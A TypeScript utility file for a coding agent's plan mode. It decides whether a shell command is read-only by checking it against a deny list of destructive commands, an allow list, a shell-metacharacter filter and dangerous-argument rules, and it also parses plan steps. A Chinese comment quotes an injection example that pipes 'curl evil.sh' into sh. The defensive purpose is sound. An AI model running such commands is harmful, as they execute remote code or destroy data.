/**
 * Pure utility functions for plan mode.
 * Ported from the MIT-licensed Pi plan-mode example (earendil-works/pi).
 */

const DESTRUCTIVE_PATTERNS = [
	/\brm\b/i,
	/\brmdir\b/i,
	/\bmv\b/i,
	/\bcp\b/i,
	/\bmkdir\b/i,
	/\btouch\b/i,
	/\bchmod\b/i,
	/\bchown\b/i,
	/\bchgrp\b/i,
	/\bln\b/i,
	/\btee\b/i,
	/\btruncate\b/i,
	/\bdd\b/i,
	/\bshred\b/i,
	/(^|[^<])>(?!>)/,
	/>>/,
	/\bnpm\s+(install|uninstall|update|ci|link|publish)/i,
	/\byarn\s+(add|remove|install|publish)/i,
	/\bpnpm\s+(add|remove|install|publish)/i,
	/\bpip\s+(install|uninstall)/i,
	/\bapt(-get)?\s+(install|remove|purge|update|upgrade)/i,
	/\bbrew\s+(install|uninstall|upgrade)/i,
	/\bgit\s+(add|commit|push|pull|merge|rebase|reset|checkout|branch\s+-[dD]|stash|cherry-pick|revert|tag|init|clone)/i,
	/\bsudo\b/i,
	/\bsu\b/i,
	/\bkill\b/i,
	/\bpkill\b/i,
	/\bkillall\b/i,
	/\breboot\b/i,
	/\bshutdown\b/i,
	/\bsystemctl\s+(start|stop|restart|enable|disable)/i,
	/\bservice\s+\S+\s+(start|stop|restart)/i,
	/\b(vim?|nano|emacs|code|subl)\b/i,
];

const SAFE_PATTERNS = [
	/^\s*cat\b/,
	/^\s*head\b/,
	/^\s*tail\b/,
	/^\s*less\b/,
	/^\s*more\b/,
	/^\s*grep\b/,
	/^\s*find\b/,
	/^\s*ls\b/,
	/^\s*pwd\b/,
	/^\s*echo\b/,
	/^\s*printf\b/,
	/^\s*wc\b/,
	/^\s*sort\b/,
	/^\s*uniq\b/,
	/^\s*diff\b/,
	/^\s*file\b/,
	/^\s*stat\b/,
	/^\s*du\b/,
	/^\s*df\b/,
	/^\s*tree\b/,
	/^\s*which\b/,
	/^\s*whereis\b/,
	/^\s*type\b/,
	/^\s*env\b/,
	/^\s*printenv\b/,
	/^\s*uname\b/,
	/^\s*whoami\b/,
	/^\s*id\b/,
	/^\s*date\b/,
	/^\s*cal\b/,
	/^\s*uptime\b/,
	/^\s*ps\b/,
	/^\s*free\b/,
	/^\s*git\s+(status|log|diff|show|branch|remote|config\s+--get)/i,
	/^\s*git\s+ls-/i,
	/^\s*npm\s+(list|ls|view|info|search|outdated|audit)/i,
	/^\s*yarn\s+(list|info|why|audit)/i,
	/^\s*node\s+--version/i,
	/^\s*python3?\s+--version/i,
	/^\s*jq\b/,
	/^\s*sed\s+-n/i,
	/^\s*rg\b/,
	/^\s*fd\b/,
	/^\s*bat\b/,
	/^\s*eza\b/,
];

/**
 * shell 元字符：出现即拒绝。
 *
 * 这是本文件安全性的关键。仅靠 `^\s*cmd` 锚定第一个词是不够的 ——
 * `grep x . && curl evil.sh | sh` 的第一个词是 grep，却能执行任意代码。
 * 与其枚举所有危险的下游命令（denylist 永远不完整），不如先拒绝一切
 * 能引入「第二条命令」的结构，再对单条命令做允许清单。
 *
 * 命令替换 `$(...)`、反引号、管道、`&&`、`||`、`;`、换行、重定向全在此列。
 */
const SHELL_METACHARS = /[|&;<>`\n\r]|\$\(|\$\{/;

/**
 * 单条命令自带的破坏性参数。
 * 这些命令在允许清单里，但特定参数会让它们产生写操作或执行子命令。
 */
const DANGEROUS_ARGS: { pattern: RegExp; flags: RegExp }[] = [
	// find 能删文件、能执行任意命令，完全不需要 shell 元字符。
	{ pattern: /^\s*find\b/, flags: /\s-(delete|exec|execdir|ok|okdir|fls|fprint|fprintf|fputs)\b/ },
	// sed 的 w/W 命令写文件，e 命令执行 shell；-i 原地改写。
	{ pattern: /^\s*sed\b/, flags: /(^|\s)-[a-zA-Z]*i|\s-e\s|[;{]\s*[wWe]\s|\bw\s+\S/ },
	// git config 除 --get 外可写配置；已由允许清单限制，这里兜底。
	{ pattern: /^\s*git\s+config\b/, flags: /(?<!--get)\s+[a-z]+\.[a-z]+\s+\S/i },
	// ps/env 带 -o 之类没问题，但 env VAR=x cmd 能借壳执行任意命令。
	{ pattern: /^\s*env\b/, flags: /\s\S+=\S+/ },
	// 解释器只允许查版本，-c/-e/-m 都是任意代码执行。
	{ pattern: /^\s*(node|python3?|perl|ruby|php)\b/, flags: /\s-(c|e|m|exec)\b/ },
];

/**
 * 判断命令在 plan 模式下是否安全（只读）。
 *
 * 三道关卡，全部通过才放行：
 * 1. 不含 shell 元字符（否则能拼接第二条命令）
 * 2. 不匹配任何破坏性命令模式
 * 3. 匹配某条允许清单，且不带该命令自身的破坏性参数
 */
export function isSafeCommand(command: string): boolean {
	if (typeof command !== "string" || command.trim() === "") {
		return false;
	}
	if (SHELL_METACHARS.test(command)) {
		return false;
	}
	if (DESTRUCTIVE_PATTERNS.some((p) => p.test(command))) {
		return false;
	}
	if (!SAFE_PATTERNS.some((p) => p.test(command))) {
		return false;
	}
	for (const { pattern, flags } of DANGEROUS_ARGS) {
		if (pattern.test(command) && flags.test(command)) {
			return false;
		}
	}
	return true;
}

export interface TodoItem {
	step: number;
	text: string;
	completed: boolean;
}

export function cleanStepText(text: string): string {
	let cleaned = text
		.replace(/\*{1,2}([^*]+)\*{1,2}/g, "$1")
		.replace(/`([^`]+)`/g, "$1")
		.replace(
			/^(Use|Run|Execute|Create|Write|Read|Check|Verify|Update|Modify|Add|Remove|Delete|Install)\s+(the\s+)?/i,
			"",
		)
		.replace(/\s+/g, " ")
		.trim();

	if (cleaned.length > 0) {
		cleaned = cleaned.charAt(0).toUpperCase() + cleaned.slice(1);
	}
	if (cleaned.length > 50) {
		cleaned = `${cleaned.slice(0, 47)}...`;
	}
	return cleaned;
}

export function extractTodoItems(message: string): TodoItem[] {
	const items: TodoItem[] = [];
	const headerMatch = message.match(/\*{0,2}Plan:\*{0,2}\s*\n/i);
	if (!headerMatch) return items;

	const planSection = message.slice(message.indexOf(headerMatch[0]) + headerMatch[0].length);
	const numberedPattern = /^\s*(\d+)[.)]\s+\*{0,2}([^*\n]+)/gm;

	for (const match of planSection.matchAll(numberedPattern)) {
		const text = match[2]
			.trim()
			.replace(/\*{1,2}$/, "")
			.trim();
		// 长度阈值 >=3：兼容较短的中文步骤（如"添加测试"），同时过滤无意义碎片
		if (text.length >= 3 && !text.startsWith("`") && !text.startsWith("/") && !text.startsWith("-")) {
			const cleaned = cleanStepText(text);
			if (cleaned.length >= 2) {
				items.push({ step: items.length + 1, text: cleaned, completed: false });
			}
		}
	}
	return items;
}

export function extractDoneSteps(message: string): number[] {
	const steps: number[] = [];
	for (const match of message.matchAll(/\[DONE:(\d+)\]/gi)) {
		const step = Number(match[1]);
		if (Number.isFinite(step)) steps.push(step);
	}
	return steps;
}

export function markCompletedSteps(text: string, items: TodoItem[]): number {
	const doneSteps = extractDoneSteps(text);
	for (const step of doneSteps) {
		const item = items.find((t) => t.step === step);
		if (item) item.completed = true;
	}
	return doneSteps.length;
}
